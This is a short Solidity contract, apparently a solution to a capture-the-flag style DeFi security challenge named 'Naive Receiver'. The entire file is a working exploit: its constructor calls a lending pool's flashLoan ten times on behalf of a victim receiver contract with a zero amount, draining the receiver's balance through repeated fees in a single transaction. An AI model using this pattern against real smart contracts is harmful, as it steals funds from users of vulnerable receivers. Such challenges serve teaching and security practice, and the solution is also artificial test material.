// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverHack {
    constructor(
        address payable poolAddress,
        address receiverAddress,
        address token
    ) {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(poolAddress).flashLoan(
                IERC3156FlashBorrower(receiverAddress),
                token,
                0,
                bytes("")
            );
        }
    }
}
